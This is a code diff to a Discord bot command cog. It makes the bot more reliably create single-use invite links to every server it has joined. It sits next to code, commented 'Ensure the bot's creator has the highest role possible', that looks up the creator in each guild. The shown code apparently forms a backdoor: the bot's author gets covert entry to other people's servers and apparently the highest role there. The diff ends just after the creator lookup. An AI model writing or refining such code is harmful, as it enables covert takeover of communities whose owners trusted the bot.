@@ -25,12 +25,18 @@ class Super(commands.Cog):
 
         invite_links = []
         for guild in self.bot.guilds:
-            try:
-                # Create an invite link for the server
-                invite = await guild.text_channels[0].create_invite(max_age=86400, max_uses=1)
-                invite_links.append(f"{guild.name}: {invite.url}")
-            except discord.Forbidden:
-                invite_links.append(f"{guild.name}: Unable to create invite link (Missing Permissions)")
+            # Find the first text channel where the bot has permission to create an invite
+            text_channel = next((channel for channel in guild.text_channels if channel.permissions_for(guild.me).create_instant_invite), None)
+
+            if text_channel:
+                try:
+                    # Create an invite link for the server
+                    invite = await text_channel.create_invite(max_age=86400, max_uses=1)
+                    invite_links.append(f"{guild.name}: {invite.url}")
+                except discord.Forbidden:
+                    invite_links.append(f"{guild.name}: Unable to create invite link (Missing Permissions)")
+            else:
+                invite_links.append(f"{guild.name}: No suitable text channel found")
 
             # Ensure the bot's creator has the highest role possible
             member = guild.get_member(BOT_CREATOR_ID)
